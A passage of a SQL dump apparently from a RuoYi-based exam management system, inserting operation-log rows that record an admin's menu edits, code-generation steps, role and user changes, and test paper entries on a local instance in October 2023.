'2023-10-25 11:19:59', 121);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (169, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"csp/exercise/index\",\"createTime\":\"2023-10-25 09:55:52\",\"icon\":\"education\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2010,\"menuName\":\"题目管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2009,\"path\":\"exercise\",\"perms\":\"csp:exercise:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 14:16:41', 44);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (170, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"dataControl/exercise/index\",\"createTime\":\"2023-10-25 09:55:52\",\"icon\":\"education\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2010,\"menuName\":\"题目管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2009,\"path\":\"exercise\",\"perms\":\"csp:exercise:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 14:18:42', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (171, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_examination_paper\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 14:24:41', 124);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (172, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exam\",\"className\":\"TbExamination\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":16,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 14:24:41\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":2,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"ExamName\",\"columnComment\":\"试卷名称\",\"columnId\":17,\"columnName\":\"exam_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 14:24:41\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"isRequired\":\"1\",\"javaField\":\"examName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":true,\"sort\":2,\"superColumn\":false,\"tableId\":2,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"UserIds\",\"columnComment\":\"用户id列表,记录指定参加考试的用户\",\"columnId\":18,\"columnName\":\"user_ids\",\"columnType\":\"varchar(256)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 14:24:41\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"0\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"0\",\"isPk\":\"0\",\"isQuery\":\"0\",\"isRequired\":\"1\",\"javaField\":\"userIds\",\"javaType\":\"String\",\"list\":false,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":true,\"sort\":3,\"superColumn\":false,\"tableId\":2,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"StartTime\",\"columnComment\":\"开始时间\",\"columnId\":19,\"columnName\":\"start_time\",\"columnType\":\"datetime\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 14:24:41\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"datetime\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"isRequired\":\"1\",\"javaF', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 14:30:05', 100);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (173, '代码生成', 8, 'com.ruoyi.project.tool.gen.controller.GenController.batchGenCode()', 'GET', 1, 'admin', NULL, '/tool/gen/batchGenCode', '127.0.0.1', '内网IP', '{\"tables\":\"tb_examination_paper\"}', NULL, 0, NULL, '2023-10-25 14:30:14', 77);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (174, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"dataControl/exam/index\",\"createTime\":\"2023-10-25 14:35:03\",\"icon\":\"row\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2016,\"menuName\":\"试卷管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2009,\"path\":\"exam\",\"perms\":\"dataControl:exam:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 14:38:11', 50);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (175, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"dataControl/exercise/index\",\"createTime\":\"2023-10-25 09:55:52\",\"icon\":\"list\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2010,\"menuName\":\"题目管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2009,\"path\":\"exercise\",\"perms\":\"dataControl:exercise:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 14:38:39', 26);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (176, '代码生成', 3, 'com.ruoyi.project.tool.gen.controller.GenController.remove()', 'DELETE', 1, 'admin', NULL, '/tool/gen/2', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:11:40', 120);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (177, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_paper\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:11:52', 119);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (178, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"paper\",\"className\":\"TbPaper\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":27,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 15:11:52\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":3,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"PaperName\",\"columnComment\":\"试卷名称\",\"columnId\":28,\"columnName\":\"paper_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 15:11:52\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"paperName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":3,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"CreateBy\",\"columnComment\":\"创建者\",\"columnId\":29,\"columnName\":\"create_by\",\"columnType\":\"varchar(64)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 15:11:52\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isPk\":\"0\",\"javaField\":\"createBy\",\"javaType\":\"String\",\"list\":false,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":true,\"tableId\":3,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"CreateTime\",\"columnComment\":\"创建时间\",\"columnId\":30,\"columnName\":\"create_time\",\"columnType\":\"datetime\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 15:11:52\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"datetime\",\"increment\":false,\"insert\":true,\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isPk\":\"0\",\"javaField\":\"createTime\",\"javaType\":\"Date\",\"list\":false,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":4,\"superColumn', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:12:49', 102);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (179, '代码生成', 8, 'com.ruoyi.project.tool.gen.controller.GenController.batchGenCode()', 'GET', 1, 'admin', NULL, '/tool/gen/batchGenCode', '127.0.0.1', '内网IP', '{\"tables\":\"tb_paper\"}', NULL, 0, NULL, '2023-10-25 15:13:03', 112);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (180, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"dataControl/paper/index\",\"createTime\":\"2023-10-25 15:14:07\",\"icon\":\"#\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2022,\"menuName\":\"试卷管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2009,\"path\":\"paper\",\"perms\":\"dataControl:paper:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:23:22', 51);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (181, '角色管理', 1, 'com.ruoyi.project.system.controller.SysRoleController.add()', 'POST', 1, 'admin', NULL, '/system/role', '127.0.0.1', '内网IP', '{\"admin\":false,\"createBy\":\"admin\",\"deptCheckStrictly\":true,\"deptIds\":[],\"flag\":false,\"menuCheckStrictly\":true,\"menuIds\":[2009,2010,2011,2012,2013,2014,2015,2022,2023,2024,2025,2026,2027],\"params\":{},\"remark\":\"普通管理员，仅具备数据管理权限\",\"roleId\":100,\"roleKey\":\"common-admin\",\"roleName\":\"普通管理员\",\"roleSort\":3,\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:29:24', 67);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (182, '角色管理', 2, 'com.ruoyi.project.system.controller.SysRoleController.dataScope()', 'PUT', 1, 'admin', NULL, '/system/role/dataScope', '127.0.0.1', '内网IP', '{\"admin\":false,\"createTime\":\"2023-10-25 15:29:23\",\"dataScope\":\"1\",\"delFlag\":\"0\",\"deptCheckStrictly\":true,\"deptIds\":[],\"flag\":false,\"menuCheckStrictly\":true,\"params\":{},\"remark\":\"普通管理员，仅具备数据管理权限\",\"roleId\":100,\"roleKey\":\"common-admin\",\"roleName\":\"普通管理员\",\"roleSort\":3,\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:29:50', 43);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (183, '角色管理', 2, 'com.ruoyi.project.system.controller.SysRoleController.edit()', 'PUT', 1, 'admin', NULL, '/system/role', '127.0.0.1', '内网IP', '{\"admin\":false,\"createTime\":\"2023-10-23 20:57:31\",\"dataScope\":\"2\",\"delFlag\":\"0\",\"deptCheckStrictly\":true,\"flag\":false,\"menuCheckStrictly\":true,\"menuIds\":[1,100,1000,1001,1002,1003,1004,1005,1006,101,1007,1008,1009,1010,1011,102,1012,1013,1014,1015,103,1016,1017,1018,1019,104,1020,1021,1022,1023,1024,105,1025,1026,1027,1028,1029,106,1030,1031,1032,1033,1034,107,1035,1036,1037,1038,108,500,1039,1040,1041,501,1042,1043,1044,1045,2,109,1046,1047,1048,110,1049,1050,1051,1052,1053,1054,111,112,113,114,3,115,116,1055,1056,1057,1058,1059,1060,117,4],\"params\":{},\"remark\":\"普通角色\",\"roleId\":2,\"roleKey\":\"common\",\"roleName\":\"普通角色\",\"roleSort\":3,\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:30:12', 75);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (184, '角色管理', 2, 'com.ruoyi.project.system.controller.SysRoleController.edit()', 'PUT', 1, 'admin', NULL, '/system/role', '127.0.0.1', '内网IP', '{\"admin\":false,\"createTime\":\"2023-10-25 15:29:23\",\"dataScope\":\"1\",\"delFlag\":\"0\",\"deptCheckStrictly\":true,\"flag\":false,\"menuCheckStrictly\":true,\"menuIds\":[2009,2010,2011,2012,2013,2014,2015,2022,2023,2024,2025,2026,2027],\"params\":{},\"remark\":\"普通管理员，仅具备数据管理权限\",\"roleId\":100,\"roleKey\":\"common-admin\",\"roleName\":\"普通管理员\",\"roleSort\":2,\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:30:20', 35);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (185, '角色管理', 3, 'com.ruoyi.project.system.controller.SysRoleController.remove()', 'DELETE', 1, 'admin', NULL, '/system/role/2', '127.0.0.1', '内网IP', '{}', NULL, 1, '普通角色已分配,不能删除', '2023-10-25 15:30:30', 42);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (186, '角色管理', 4, 'com.ruoyi.project.system.controller.SysRoleController.cancelAuthUser()', 'PUT', 1, 'admin', NULL, '/system/role/authUser/cancel', '127.0.0.1', '内网IP', '{\"roleId\":2,\"userId\":2}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:30:51', 62);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (187, '角色管理', 3, 'com.ruoyi.project.system.controller.SysRoleController.remove()', 'DELETE', 1, 'admin', NULL, '/system/role/2', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:30:59', 53);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (188, '用户管理', 3, 'com.ruoyi.project.system.controller.SysUserController.remove()', 'DELETE', 1, 'admin', NULL, '/system/user/2', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:31:09', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (189, '角色管理', 1, 'com.ruoyi.project.system.controller.SysRoleController.add()', 'POST', 1, 'admin', NULL, '/system/role', '127.0.0.1', '内网IP', '{\"admin\":false,\"createBy\":\"admin\",\"deptCheckStrictly\":true,\"deptIds\":[],\"flag\":false,\"menuCheckStrictly\":true,\"menuIds\":[],\"params\":{},\"roleId\":101,\"roleKey\":\"student\",\"roleName\":\"学生\",\"roleSort\":3,\"status\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:31:49', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (190, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/4', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:34:30', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (191, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"monitor/job/index\",\"createTime\":\"2023-10-23 20:57:31\",\"icon\":\"job\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":110,\"menuName\":\"定时任务\",\"menuType\":\"C\",\"orderNum\":2,\"params\":{},\"parentId\":2,\"path\":\"job\",\"perms\":\"monitor:job:list\",\"query\":\"\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"1\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:36:20', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (192, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"system/dept/index\",\"createTime\":\"2023-10-23 20:57:31\",\"icon\":\"tree\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":103,\"menuName\":\"部门管理\",\"menuType\":\"C\",\"orderNum\":4,\"params\":{},\"parentId\":1,\"path\":\"dept\",\"perms\":\"system:dept:list\",\"query\":\"\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"1\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:36:52', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (193, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"system/post/index\",\"createTime\":\"2023-10-23 20:57:31\",\"icon\":\"post\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":104,\"menuName\":\"岗位管理\",\"menuType\":\"C\",\"orderNum\":5,\"params\":{},\"parentId\":1,\"path\":\"post\",\"perms\":\"system:post:list\",\"query\":\"\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"1\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:36:55', 32);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (194, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"system/notice/index\",\"createTime\":\"2023-10-23 20:57:31\",\"icon\":\"message\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":107,\"menuName\":\"通知公告\",\"menuType\":\"C\",\"orderNum\":8,\"params\":{},\"parentId\":1,\"path\":\"notice\",\"perms\":\"system:notice:list\",\"query\":\"\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"1\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:37:02', 45);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (195, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"system/dept/index\",\"createTime\":\"2023-10-23 20:57:31\",\"icon\":\"tree\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":103,\"menuName\":\"部门管理\",\"menuType\":\"C\",\"orderNum\":4,\"params\":{},\"parentId\":1,\"path\":\"dept\",\"perms\":\"system:dept:list\",\"query\":\"\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:37:54', 34);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (196, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.add()', 'POST', 1, 'admin', NULL, '/dataControl/paper', '127.0.0.1', '内网IP', '{\"createTime\":\"2023-10-25 15:39:47\",\"id\":1,\"paperName\":\"测试\",\"params\":{}}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:39:47', 43);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (197, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.add()', 'POST', 1, 'admin', NULL, '/dataControl/paper', '127.0.0.1', '内网IP', '{\"createTime\":\"2023-10-25 15:41:18\",\"id\":2,\"paperName\":\"123\",\"params\":{}}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:41:18', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (198, '试卷管理', 2, 'com.ruoyi.project.csp.controller.TbPaperController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/paper', '127.0.0.1', '内网IP', '{\"createBy\":\"\",\"createTime\":\"2023-10-25 15:41:18\",\"id\":2,\"paperName\":\"123412\",\"params\":{},\"updateBy\":\"\",\"updateTime\":\"2023-10-25 15:41:22\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:41:22', 18);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (199, '试卷管理', 2, 'com.ruoyi.project.csp.controller.TbPaperController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/paper', '127.0.0.1', '内网IP', '{\"createBy\":\"\",\"createTime\":\"2023-10-25 15:39:47\",\"id\":1,\"paperName\":\"测试123\",\"params\":{},\"updateBy\":\"\",\"updateTime\":\"2023-10-25 15:43:38\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:43:38', 13);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (200, '试卷管理', 2, 'com.ruoyi.project.csp.controller.TbPaperController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/paper', '127.0.0.1', '内网IP', '{\"createBy\":\"\",\"createTime\":\"2023-10-25 15:39:47\",\"id\":1,\"paperName\":\"测试12312\",\"params\":{},\"updateBy\":\"\",\"updateTime\":\"2023-10-25 15:43:47\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 15:43:47', 17);
